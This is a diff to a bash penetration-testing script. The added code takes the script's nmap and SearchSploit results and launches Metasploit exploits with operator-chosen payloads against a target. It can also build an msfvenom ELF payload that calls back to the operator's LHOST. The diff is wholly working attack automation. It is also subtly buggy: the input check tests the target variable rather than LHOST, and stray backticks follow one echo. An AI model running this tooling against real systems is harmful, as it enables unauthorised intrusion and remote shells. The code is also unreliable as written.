@@ -65,12 +65,52 @@ xml_parse(){
     echo -e "\e[1;32mOpen ports saved to open_ports.txt.\e[0m"
 }
 
+
 searchsploit_services() {
     #searches through the nmap file
     echo -e "\e[1;34mSearching for exploits using SearchSploit...\e[0m"
     searchsploit --nmap nmap_scan_$target.xml > exploits_$target.txt
     echo -e "\e[1;32mExploits saved to exploits_$target.txt.\e[0m"
+    less exploits_$target.txt
 }
+
+msfconsole_options() {
+    echo -e "\e[1;34mSetting up Metasploit options...\e[0m"
+    read -p "Enter local port (LPORT): " lport
+    read -p "Enter local IP (LHOST): " lhost
+    read -p "Enter exploit: " exploit
+    # Validate inputs
+    if [ -z "$exploit" ] || [ -z "$lport" ] || [ -z "$target" ]; then
+        echo -e "\e[1;31mError: Exploit, LPORT, and LHOST cannot be empty.\e[0m"``
+        return 1
+    fi
+}
+
+execute_msfconsole() {
+    echo -e "\e[1;34mLaunching Metasploit Framework...\e[0m"
+    msfconsole -q -x "use $exploit; set PAYLOAD $payload; set LPORT $lport; set RHOST $target; set LHOST $lhost; run"
+} 
+
+execute_msfvenom() {
+    echo -e "\e[1;34mCreating payload with msfvenom...\e[0m"
+    msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f elf > shell-x86.elf
+    echo -e "\e[1;32mPayload created: shell-x86.elf\e[0m"
+    execute_msfconsole
+}
+
+set_payload() {
+    echo -e "do you want to use msfvenom to create a payload? (y/n)"
+    read -r create_payload
+    if [[ "$create_payload" == "y" || "$create_payload" == "Y" ]]; then
+        read -p "Enter the msfvenom payload you want to use: " payload
+        execute_msfvenom
+    else
+        read -p "Enter the msfconsole payload you want to use: " payload
+        execute_msfconsole
+    fi
+}
+
+
 
 # Main script execution
 check_dependencies
@@ -80,3 +120,7 @@ nmap_scan
 xml_parse
 
 searchsploit_services
+
+msfconsole_options
+
+set_payload
